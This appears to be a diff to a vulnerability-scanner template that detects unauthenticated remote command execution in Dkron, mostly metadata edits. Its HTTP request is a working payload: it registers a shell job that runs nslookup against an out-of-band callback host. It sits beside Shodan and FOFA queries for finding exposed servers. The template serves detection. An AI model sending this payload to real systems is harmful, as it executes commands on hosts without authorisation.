@@ -1,5 +1,4 @@
 id: dkron-unauth-rce
-
 info:
   name: Dkron - Unauthenticated Remote Command Execution
   author: icarot
@@ -9,15 +8,13 @@ info:
   reference:
     - https://github.com/distribworks/dkron/
   metadata:
-    runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Dkron"})
     fofa-query: title="Dkron"
     shodan-query: title:"Dkron"
+    verified: true
   tags: dkron,unauth,rce,oast,obb,vuln
-
 variables:
   string: "{{to_lower(rand_text_alpha(5))}}"
-
 http:
   - raw:
       - |
@@ -26,7 +23,6 @@ http:
         Accept: application/json
 
         {"ephemeral":true,"disabled":false,"name":"{{string}}","schedule":"@every 1s","executor":"shell","executor_config":{"command":"nslookup  {{string}}.{{interactsh-url}}","cwd":"/tmp/","env":"ENV_VAR=va1,ANOTHER_ENV_VAR=var2","shell":"true","timeout":"10s"},"retries":null}
-
     matchers:
       - type: dsl
         dsl:
@@ -35,4 +31,3 @@ http:
           - "contains_all(body, 'success_count','owner_email')"
           - "status_code == 201"
         condition: and
-
